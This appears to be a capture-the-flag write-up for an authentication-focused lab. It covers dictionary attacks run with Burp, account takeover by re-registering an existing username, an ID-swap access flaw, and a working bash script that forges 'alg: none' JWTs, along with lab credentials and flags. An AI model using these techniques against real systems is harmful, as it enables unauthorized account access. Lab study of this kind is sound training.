> Authenticate

# Dictionar Attack using Burp

And we have been given credentials for jack.`12345678`

# flag

```
fad9ddc1feebd9e9bca05f02dd89e271
```

Let's find for mike. And we got a hit `12345`.

# flag

```
e1faaa144df2f24aa0a9284f4a5bb578
```

# Re-Registration

We already have an user called `darren`. Let's try to re register this account. ` darren`:`darren`. And we are in as darren!

# Flag

```
fe86079416a21a3c99937fea8874b667
```

Let's re-register another user arthur. ` arthur`:`arthur`

# JSON Web Token

This challenge visit the port 5000. It is a very simple login page and in that, you can log in via two users: user and user2. Now first let's try to login with the credentials of `user`:`user` . To do so first enter those credentials then click on the Authenticate button. Then enable the capture in burp suite and then click on the Go button.

```
#!/bin/bash

header=$(echo '{"typ":"JWT","alg":"NONE"}' | base64url | sed 's/=*$//')
payload=$(curl -s http://10.10.240.179:5000/auth --data '{"username": "user", "password": "user"}' -H "Content-Type: application/json" | \
     sed 's/.*:".*\.\(.*\)\..*$/\1/' | base64 -d 2>/dev/null | sed "s/\:1\}/\:$1\}/" | base64url | sed 's/=*$//')
jwt="${header}.${payload}."

curl -s http://10.10.240.179:5000/protected -H "Content-Type: application/json" -H "Authorization: JWT ${jwt}"
echo
```

# NoAuth

We can create a temp user. And viewing our private space we get an interesting URL `http://10.10.240.179:7777/users/1`. Let's change it to `http://10.10.240.179:7777/users/0` and we have what we want.

```
Your password:
abcd1234

Your secret data:
Here's your flag: 72102933396288983011
```